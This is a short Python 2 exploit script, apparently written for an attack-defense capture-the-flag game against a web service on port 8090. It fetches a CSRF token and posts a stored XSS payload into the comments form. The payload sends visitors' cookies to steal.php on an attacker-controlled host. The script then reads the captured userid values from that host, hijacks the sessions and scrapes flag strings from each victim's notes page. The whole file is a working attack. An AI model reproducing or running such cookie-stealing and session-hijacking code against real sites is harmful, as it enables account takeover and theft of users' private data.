#!/usr/bin/env python2

##
## By REBZYA TEAM and @juwilie
##

import sys
import requests
import time
import re

ip = sys.argv[1]
team_ip = '6.6.2.2'
data = ''
log_file = 'log1337.txt'

exploit = '<script>var url=\'http://{}:8090/steal.php?c=\'+document.cookie;fetch(url);</script>'.format(team_ip)

url = 'http://{}:8090/comments/default/create'.format(ip)

sess = requests.Session()
tok = sess.get('http://{}:8090/'.format(ip)).content
sr = re.findall(r'name="_csrf" value="(.*)">', tok)
token = sr[0].split(' ')[0][:-2]

r = sess.post(url, data={'Comments[txt]' : exploit,
                         '_csrf' : token}, headers={'X-CSRF-Token' : token, 'X-Requested-With' : 'XMLHttpRequest'})


data_ = sess.get('http://{}:8090/{}'.format(team_ip, log_file)).content
sr = re.findall(r'userid=(\w+)', data_)

for usrid in sr:
    sess.cookies.update({'userid': usrid})
    resp = sess.get('http://{}:8090/notes'.format(ip)).content

    srr = re.findall(r'[A-Z0-9]{31}=', resp)
    for flag in srr:
        print flag
        sys.stdout.flush()